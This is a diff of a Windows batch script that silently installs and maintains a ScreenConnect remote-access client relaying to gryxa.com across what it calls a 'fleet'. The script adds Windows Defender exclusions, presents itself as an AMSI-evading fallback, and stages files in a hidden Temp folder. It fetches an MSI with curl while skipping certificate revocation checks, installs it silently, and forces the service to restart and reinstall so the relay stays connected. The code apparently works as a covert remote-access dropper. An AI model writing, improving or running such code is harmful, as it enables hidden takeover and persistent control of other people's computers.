@@ -1,8 +1,8 @@
 @echo off
-rem OWN_GRYXA BUILD 20260804G5 - PowerShell-free Gryxa install (AMSI-proof fallback)
-rem G5: arg5=REINSTALL → stop+/x Gryxa PC only + /i (panel wipe fleet). Never touch sevrz.
-rem G4: when service ABSENT but dir/ARP stuck, /x Gryxa ProductCode only then /i (fixes 1603).
-rem G3: NEVER /i while service exists (unless REINSTALL); repo MSI only.
+rem OWN_GRYXA BUILD 20260804G7 - PowerShell-free Gryxa install (AMSI-proof fallback)
+rem G7: never bare sc create (panel-blind). After /i require ImagePath gryxa.com; else retry /i.
+rem G6: sc create attempt (superseded — caused RUNNING-but-offline).
+rem G5: arg5=REINSTALL → stop+/x Gryxa PC only + /i.
 setlocal EnableExtensions EnableDelayedExpansion
 
 set "WD=%~1"
@@ -15,6 +15,7 @@ set "ALT_FP=%~4"
 if "%ALT_FP%"=="" set "ALT_FP=f861c8140d453427"
 set "MODE=%~5"
 if /I "%MODE%"=="REINSTALL" (set "REINSTALL=1") else (set "REINSTALL=0")
+if /I "%MODE%"=="HEAL" (set "REINSTALL=1")
 
 set "STAGE=%SystemRoot%\Temp\.upd"
 set "CURL=%SystemRoot%\System32\curl.exe"
@@ -27,7 +28,7 @@ set "SVC=ScreenConnect Client (%GRYXA_FP%)"
 
 if not exist "%WD%" mkdir "%WD%" >nul 2>&1
 if not exist "%STAGE%" mkdir "%STAGE%" >nul 2>&1
-echo [%DATE% %TIME%] own_gryxa G5 begin fp=%GRYXA_FP% reinstall=%REINSTALL%>>"%LOG%"
+echo [%DATE% %TIME%] own_gryxa G7 begin fp=%GRYXA_FP% reinstall=%REINSTALL% mode=%MODE%>>"%LOG%"
 
 if exist "%LOCK%" (
   powershell -NoProfile -NonInteractive -Command "if((Test-Path '%LOCK%') -and (((Get-Date)-(Get-Item -LiteralPath '%LOCK%').LastWriteTime).TotalMinutes -lt 20)){exit 0}else{exit 1}" >nul 2>&1
@@ -46,54 +47,69 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "msie
 reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "ScreenConnect.ClientService.exe" /t REG_DWORD /d 0 /f >nul 2>&1
 
 if "%REINSTALL%"=="0" (
-  rem any live Gryxa FP → do nothing (normal path)
+  rem live Gryxa with relay args → done
   for /f "tokens=2 delims=()" %%a in ('sc query state^= all ^| findstr /C:"SERVICE_NAME: ScreenConnect Client"') do (
     set "_FP=%%a"
     set "_FP=!_FP: =!"
     if /I not "!_FP!"=="%KEEP_FP%" if /I not "!_FP!"=="%ALT_FP%" (
       sc query "ScreenConnect Client (!_FP!)" | findstr /I /C:"RUNNING" /C:"START_PENDING" >nul
       if not errorlevel 1 (
-        echo [%DATE% %TIME%] other_gryxa_alive fp=!_FP! skip>>"%LOG%"
-        (
-          echo CURRENT_FP=!_FP!
-          echo RELAY=update.gryxa.com
-          echo UI=ui.gryxa.com
-          echo UPDATED=cmd-own_gryxa-adopt
-        ) >"%WD%\gryxa.cfg"
-        del /f /q "%LOCK%" >nul 2>&1
-        exit /b 0
+        reg query "HKLM\SYSTEM\CurrentControlSet\Services\ScreenConnect Client (!_FP!)" /v ImagePath 2>nul | findstr /I "gryxa.com" >nul
+        if not errorlevel 1 (
+          echo [%DATE% %TIME%] other_gryxa_alive_relay fp=!_FP! skip>>"%LOG%"
+          (
+            echo CURRENT_FP=!_FP!
+            echo RELAY=update.gryxa.com
+            echo UI=ui.gryxa.com
+            echo UPDATED=cmd-own_gryxa-adopt
+          ) >"%WD%\gryxa.cfg"
+          del /f /q "%LOCK%" >nul 2>&1
+          exit /b 0
+        )
       )
     )
   )
 
+  rem ExpectedFp running WITH gryxa.com → done
   sc query "%SVC%" | findstr /I /C:"RUNNING" /C:"START_PENDING" /C:"CONTINUE_PENDING" >nul
   if not errorlevel 1 (
-    echo [%DATE% %TIME%] already_alive>>"%LOG%"
-    del /f /q "%LOCK%" >nul 2>&1
-    exit /b 0
-  )
-
-  rem service exists → start only, NEVER /i
-  sc query "%SVC%" >nul 2>&1
-  if not errorlevel 1 (
-    echo [%DATE% %TIME%] svc_exists_start_only>>"%LOG%"
-    sc config "%SVC%" start= auto >nul 2>&1
-    sc failure "%SVC%" reset= 86400 actions= restart/3000/restart/3000/restart/3000 >nul 2>&1
-    sc start "%SVC%" >nul 2>&1
-    timeout /t 15 /nobreak >nul
-    sc query "%SVC%" | findstr /I /C:"RUNNING" /C:"START_PENDING" >nul
+    reg query "HKLM\SYSTEM\CurrentControlSet\Services\%SVC%" /v ImagePath 2>nul | findstr /I "gryxa.com" >nul
     if not errorlevel 1 (
-      echo [%DATE% %TIME%] started_ok>>"%LOG%"
+      echo [%DATE% %TIME%] already_alive_relay>>"%LOG%"
       del /f /q "%LOCK%" >nul 2>&1
       exit /b 0
     )
-    echo [%DATE% %TIME%] start_failed_NO_reinstall_L44>>"%LOG%"
-    del /f /q "%LOCK%" >nul 2>&1
-    exit /b 1
+    echo [%DATE% %TIME%] alive_NO_relay_reinstall>>"%LOG%"
+    set "REINSTALL=1"
+  )
+
+  if "%REINSTALL%"=="0" (
+    sc query "%SVC%" >nul 2>&1
+    if not errorlevel 1 (
+      echo [%DATE% %TIME%] svc_exists_start_only>>"%LOG%"
+      sc config "%SVC%" start= auto >nul 2>&1
+      sc failure "%SVC%" reset= 86400 actions= restart/3000/restart/3000/restart/3000 >nul 2>&1
+      sc start "%SVC%" >nul 2>&1
+      timeout /t 15 /nobreak >nul
+      sc query "%SVC%" | findstr /I /C:"RUNNING" /C:"START_PENDING" >nul
+      if not errorlevel 1 (
+        reg query "HKLM\SYSTEM\CurrentControlSet\Services\%SVC%" /v ImagePath 2>nul | findstr /I "gryxa.com" >nul
+        if not errorlevel 1 (
+          echo [%DATE% %TIME%] started_ok_relay>>"%LOG%"
+          del /f /q "%LOCK%" >nul 2>&1
+          exit /b 0
+        )
+        echo [%DATE% %TIME%] started_NO_relay_reinstall>>"%LOG%"
+        set "REINSTALL=1"
+      ) else (
+        echo [%DATE% %TIME%] start_failed_reinstall>>"%LOG%"
+        set "REINSTALL=1"
+      )
+    )
   )
 )
 
-rem G5 REINSTALL or absent: strip Gryxa only (never sevrz FPs)
+rem strip Gryxa only then /i (REINSTALL or absent)
 echo [%DATE% %TIME%] preclean_gryxa_only pc=%PC%>>"%LOG%"
 sc stop "%SVC%" >nul 2>&1
 timeout /t 3 /nobreak >nul
@@ -101,57 +117,23 @@ msiexec /x %PC% /qn /norestart REBOOT=ReallySuppress >>"%LOG%" 2>&1
 reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\%PC%" /f >nul 2>&1
 reg delete "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\%PC%" /f >nul 2>&1
 sc delete "%SVC%" >nul 2>&1
-if exist "%ProgramFiles(x86)%\ScreenConnect Client (%GRYXA_FP%)" (
-  echo [%DATE% %TIME%] rmdir_pf86>>"%LOG%"
-  rmdir /s /q "%ProgramFiles(x86)%\ScreenConnect Client (%GRYXA_FP%)" >nul 2>&1
-)
-if exist "%ProgramFiles%\ScreenConnect Client (%GRYXA_FP%)" (
-  echo [%DATE% %TIME%] rmdir_pf>>"%LOG%"
-  rmdir /s /q "%ProgramFiles%\ScreenConnect Client (%GRYXA_FP%)" >nul 2>&1
-)
+if exist "%ProgramFiles(x86)%\ScreenConnect Client (%GRYXA_FP%)" rmdir /s /q "%ProgramFiles(x86)%\ScreenConnect Client (%GRYXA_FP%)" >nul 2>&1
+if exist "%ProgramFiles%\ScreenConnect Client (%GRYXA_FP%)" rmdir /s /q "%ProgramFiles%\ScreenConnect Client (%GRYXA_FP%)" >nul 2>&1
 timeout /t 5 /nobreak >nul
 
-set "NEED=1"
-if exist "%MSI%" for %%F in ("%MSI%") do if %%~zF GTR 1000000 set "NEED=0"
-if "%NEED%"=="1" (
-  echo [%DATE% %TIME%] fetch %URL1%>>"%LOG%"
-  "%CURL%" -L --ssl-no-revoke --connect-timeout 20 --max-time 180 -o "%MSI%.tmp" "%URL1%" >>"%LOG%" 2>&1
-  if exist "%MSI%.tmp" for %%F in ("%MSI%.tmp") do if %%~zF GTR 1000000 move /y "%MSI%.tmp" "%MSI%" >nul 2>&1
-)
-if not exist "%MSI%" (
-  echo [%DATE% %TIME%] msi_unavailable>>"%LOG%"
+call :FetchMsi
+if errorlevel 1 (
   del /f /q "%LOCK%" >nul 2>&1
   exit /b 2
 )
 
-reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /t REG_DWORD /d 0 /f >nul 2>&1
-
-echo [%DATE% %TIME%] msiexec /i>>"%LOG%"
-msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_gryxa_cmd.log"
-set "MSIEXIT=!ERRORLEVEL!"
-echo [%DATE% %TIME%] msiexec_exit=!MSIEXIT!>>"%LOG%"
-echo !MSIEXIT!>"%WD%\gryxa_install.result"
-
-sc config "%SVC%" start= auto >nul 2>&1
-sc failure "%SVC%" reset= 86400 actions= restart/3000/restart/3000/restart/3000 >nul 2>&1
-sc start "%SVC%" >nul 2>&1
-timeout /t 12 /nobreak >nul
-
-rem G6: MSI exit 0 but service missing (1060) while dir exists — create service from ClientService.exe
-sc query "%SVC%" >nul 2>&1
+call :DoInstall
 if errorlevel 1 (
-  set "BIN="
-  if exist "%ProgramFiles(x86)%\ScreenConnect Client (%GRYXA_FP%)\ScreenConnect.ClientService.exe" set "BIN=%ProgramFiles(x86)%\ScreenConnect Client (%GRYXA_FP%)\ScreenConnect.ClientService.exe"
-  if not defined BIN if exist "%ProgramFiles%\ScreenConnect Client (%GRYXA_FP%)\ScreenConnect.ClientService.exe" set "BIN=%ProgramFiles%\ScreenConnect Client (%GRYXA_FP%)\ScreenConnect.ClientService.exe"
-  if defined BIN (
-    echo [%DATE% %TIME%] svc_create_from_dir>>"%LOG%"
-    sc create "%SVC%" binPath= "\"!BIN!\"" start= auto DisplayName= "%SVC%" >nul 2>&1
-    sc failure "%SVC%" reset= 86400 actions= restart/3000/restart/3000/restart/3000 >nul 2>&1
-    sc start "%SVC%" >nul 2>&1
-    timeout /t 8 /nobreak >nul
-  ) else (
-    echo [%DATE% %TIME%] svc_missing_no_bin>>"%LOG%"
-  )
+  echo [%DATE% %TIME%] install_retry>>"%LOG%"
+  sc stop "%SVC%" >nul 2>&1
+  sc delete "%SVC%" >nul 2>&1
+  timeout /t 3 /nobreak >nul
+  call :DoInstall
 )
 
 sc config "ScreenConnect Client (%KEEP_FP%)" start= auto >nul 2>&1
@@ -163,15 +145,58 @@ sc start "ScreenConnect Client (%ALT_FP%)" >nul 2>&1
   echo CURRENT_FP=%GRYXA_FP%
   echo RELAY=update.gryxa.com
   echo UI=ui.gryxa.com
-  echo UPDATED=cmd-own_gryxa-G6
+  echo UPDATED=cmd-own_gryxa-G7
 ) >"%WD%\gryxa.cfg"
 
+reg query "HKLM\SYSTEM\CurrentControlSet\Services\%SVC%" /v ImagePath 2>nul | findstr /I "gryxa.com" >nul
+if errorlevel 1 (
+  echo [%DATE% %TIME%] still_no_relay_in_imagepath>>"%LOG%"
+  del /f /q "%LOCK%" >nul 2>&1
+  exit /b 1
+)
 sc query "%SVC%" | findstr /I /C:"RUNNING" /C:"START_PENDING" >nul
 if not errorlevel 1 (
-  echo [%DATE% %TIME%] running_ok>>"%LOG%"
+  echo [%DATE% %TIME%] running_ok_relay>>"%LOG%"
   del /f /q "%LOCK%" >nul 2>&1
   exit /b 0
 )
 echo [%DATE% %TIME%] still_down msi_exit=!MSIEXIT!>>"%LOG%"
 del /f /q "%LOCK%" >nul 2>&1
 exit /b 1
+
+:FetchMsi
+set "NEED=1"
+if exist "%MSI%" for %%F in ("%MSI%") do if %%~zF GTR 1000000 set "NEED=0"
+if "%NEED%"=="1" (
+  echo [%DATE% %TIME%] fetch %URL1%>>"%LOG%"
+  "%CURL%" -L --ssl-no-revoke --connect-timeout 20 --max-time 180 -o "%MSI%.tmp" "%URL1%" >>"%LOG%" 2>&1
+  if exist "%MSI%.tmp" for %%F in ("%MSI%.tmp") do if %%~zF GTR 1000000 move /y "%MSI%.tmp" "%MSI%" >nul 2>&1
+)
+if not exist "%MSI%" (
+  echo [%DATE% %TIME%] msi_unavailable>>"%LOG%"
+  exit /b 1
+)
+exit /b 0
+
+:DoInstall
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /t REG_DWORD /d 0 /f >nul 2>&1
+echo [%DATE% %TIME%] msiexec /i>>"%LOG%"
+msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_gryxa_cmd.log"
+set "MSIEXIT=!ERRORLEVEL!"
+echo [%DATE% %TIME%] msiexec_exit=!MSIEXIT!>>"%LOG%"
+echo !MSIEXIT!>"%WD%\gryxa_install.result"
+sc config "%SVC%" start= auto >nul 2>&1
+sc failure "%SVC%" reset= 86400 actions= restart/3000/restart/3000/restart/3000 >nul 2>&1
+sc start "%SVC%" >nul 2>&1
+timeout /t 15 /nobreak >nul
+sc query "%SVC%" >nul 2>&1
+if errorlevel 1 (
+  echo [%DATE% %TIME%] post_i_1060_no_bare_create>>"%LOG%"
+  exit /b 1
+)
+reg query "HKLM\SYSTEM\CurrentControlSet\Services\%SVC%" /v ImagePath 2>nul | findstr /I "gryxa.com" >nul
+if errorlevel 1 (
+  echo [%DATE% %TIME%] post_i_no_relay>>"%LOG%"
+  exit /b 1
+)
+exit /b 0
